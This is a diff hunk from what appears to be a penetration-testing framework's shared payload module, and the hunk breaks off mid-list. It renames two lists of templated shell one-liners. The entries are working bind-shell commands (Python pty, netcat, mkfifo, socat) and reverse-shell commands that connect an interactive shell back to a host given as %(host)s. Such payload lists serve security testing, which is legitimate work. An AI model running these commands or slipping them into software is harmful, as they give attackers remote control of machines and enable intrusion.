@@ -2,14 +2,14 @@
 # Shared payloads
 #
 
-bash_tcp_shell = [
+bash_bind_shell = [
     """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("", %(port)s));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn("%(shell)s");s.close()'""",
     """nc -l -p %(port)s -e %(shell)s""",
     """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|%(shell)s -i 2>&1|nc -l %(port)s >/tmp/f; rm -rf /tmp/f""",
     """socat tcp-l:%(port)s exec:%(shell)s"""
 ]
 
-bash_reverse_tcp_shell = [
+bash_reverse_shell = [
     """sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|%(shell)s -i 2>&1|nc %(host)s %(port)s >/tmp/f""",
     """sleep 1; nc -e %(shell)s %(host)s %(port)s""",
     """sleep 1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%(host)s",%(port)s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["%(shell)s","-i"]);'""",
